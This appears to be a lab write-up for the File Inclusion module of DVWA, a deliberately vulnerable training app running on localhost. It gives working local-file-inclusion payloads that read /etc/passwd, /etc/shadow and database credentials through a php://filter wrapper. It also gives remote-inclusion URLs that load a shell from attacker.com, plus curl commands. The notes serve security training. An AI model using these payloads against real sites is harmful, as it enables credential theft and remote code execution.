# DVWA File Inclusion — Low Security

## URL
http://127.0.0.1:4280/vulnerabilities/fi/?page=include.php

## Vulnerable Parameter
page (GET parameter)

## Source Code Behavior (Low)
- No input validation at all
- Directly includes whatever file is specified: `include($_GET['page']);`
- Supports both local and remote file inclusion (if PHP config allows)

## Prerequisites
- For RFI: `allow_url_include = On` in php.ini
- For LFI: just needs file read permissions

## Working Payloads — Local File Inclusion (LFI)

### Read /etc/passwd
```
http://127.0.0.1:4280/vulnerabilities/fi/?page=/etc/passwd
```

### Path traversal to read /etc/passwd
```
http://127.0.0.1:4280/vulnerabilities/fi/?page=../../../../../../etc/passwd
```

### Read DVWA config (database credentials)
```
http://127.0.0.1:4280/vulnerabilities/fi/?page=../../config/config.inc.php
```
Note: PHP file will be executed, not displayed. Use PHP wrappers to read source.

### PHP filter wrapper (read PHP source code as base64)
```
http://127.0.0.1:4280/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../config/config.inc.php
```
Decode the base64 output to see the PHP source with database credentials.

### Read /etc/shadow (if permissions allow)
```
http://127.0.0.1:4280/vulnerabilities/fi/?page=/etc/shadow
```

## Working Payloads — Remote File Inclusion (RFI)

### Include remote file
```
http://127.0.0.1:4280/vulnerabilities/fi/?page=http://attacker.com/shell.php
```

### Include remote file with null byte (older PHP)
```
http://127.0.0.1:4280/vulnerabilities/fi/?page=http://attacker.com/shell.txt%00
```

## Step-by-Step Exploitation
1. Visit default page — `?page=include.php` loads normally
2. Try `?page=/etc/passwd` — displays system users
3. Try `?page=php://filter/convert.base64-encode/resource=../../config/config.inc.php` — get base64 encoded config
4. Decode base64 — reveals database username, password, host

## curl Commands
```bash
# LFI — read /etc/passwd
curl -v "http://127.0.0.1:4280/vulnerabilities/fi/?page=/etc/passwd" \
  -b "PHPSESSID=<session>;security=low"

# LFI — read PHP source via filter
curl -v "http://127.0.0.1:4280/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../config/config.inc.php" \
  -b "PHPSESSID=<session>;security=low"

# Decode the base64 output
echo "<base64_output>" | base64 -d
```

## Notes
- Absolute paths and relative paths both work
- PHP wrappers (php://filter, php://input) are powerful LFI tools
- No filtering at all on the page parameter
